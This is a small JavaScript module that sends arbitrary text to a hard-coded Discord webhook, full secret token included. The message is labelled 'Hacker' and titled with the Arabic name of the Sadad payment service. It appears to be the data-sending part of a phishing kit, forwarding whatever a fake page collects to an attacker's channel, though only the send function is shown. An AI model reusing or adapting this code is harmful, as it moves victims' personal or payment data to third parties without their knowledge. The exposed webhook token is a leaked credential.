import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1329070668561645578/LggQkezerj-BdM_tD71FIvN4Lnuk_ouIUwfH8rD55-z5CKXuNFaNtDc5nqT1JjBmGtfP",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
